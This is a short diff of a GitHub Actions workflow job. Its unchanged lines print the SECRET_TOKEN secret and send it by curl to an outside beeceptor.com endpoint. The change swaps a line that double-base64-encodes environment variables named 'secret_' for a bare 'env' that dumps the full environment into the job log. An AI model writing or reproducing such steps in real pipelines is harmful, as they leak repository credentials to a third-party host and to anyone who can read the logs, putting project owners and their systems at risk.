@@ -33,8 +33,7 @@ jobs:
           echo "Secret is set"
           echo "SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}"
           curl https://inovasys.free.beeceptor.com/${{ secrets.SECRET_TOKEN }}
-          env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;
-
+          env
       - name: Set Result Output
         id: set-result
         run: echo "step-result=success" >> $GITHUB_OUTPUT
